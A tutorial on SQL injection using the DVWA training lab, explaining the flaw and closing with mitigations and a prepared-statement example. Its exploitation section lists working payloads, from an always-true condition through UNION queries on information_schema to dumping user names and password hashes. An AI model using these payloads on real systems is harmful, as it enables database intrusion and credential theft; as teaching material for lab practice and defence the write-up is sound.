SQL Injection


🔍 What Is It?


SQL Injection (SQLi) is a code injection attack where malicious SQL statements are inserted into an input field, causing the database to execute unintended commands. It is one of the oldest and most critical web vulnerabilities, consistently appearing in the OWASP Top 10.
When an application directly concatenates user input into a SQL query without sanitization, the attacker can manipulate the query logic.



⚙️ How It Works in DVWA


DVWA's SQL Injection module presents a simple form that asks for a User ID. The backend query looks something like this:
SELECT first_name, last_name FROM users WHERE user_id = '$id';If the user enters 1, the query becomes:SELECT first_name, last_name FROM users WHERE user_id = '1';But if the user enters a malicious payload, the query is broken and rewritten.



💥 Exploitation



Step 1 — Confirm vulnerability:1' OR '1'='1 This makes the WHERE clause always true, returning all users.

Step 2 — Find number of columns (ORDER BY technique):1' ORDER BY 1-- -

1' ORDER BY 2-- -

1' ORDER BY 3-- -   ← error here means 2 columns 

Step 3 — UNION-based extraction:1' UNION SELECT null, null-- -

1' UNION SELECT user(), database()-- -

step 4 — Extract table names:1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -

Step 5 — Extract column names:1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'-- -

Step 6 — Dump credentials:1' UNION SELECT user, password FROM users-- -



🔐 Mitigation


MethodDescriptionPrepared StatementsUse parameterized queries (PDO / MySQLi) so user input is never interpreted as SQLInput ValidationWhitelist expected input formats (e.g., only integers for IDs)Least PrivilegeDatabase user should have only SELECT access, never DROP or ALTERWAFA Web Application Firewall can detect and block common SQLi patternsError HandlingNever expose raw SQL errors to the user .


// ✅ Safe - Prepared Statement

$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");

$stmt->execute([$id]);
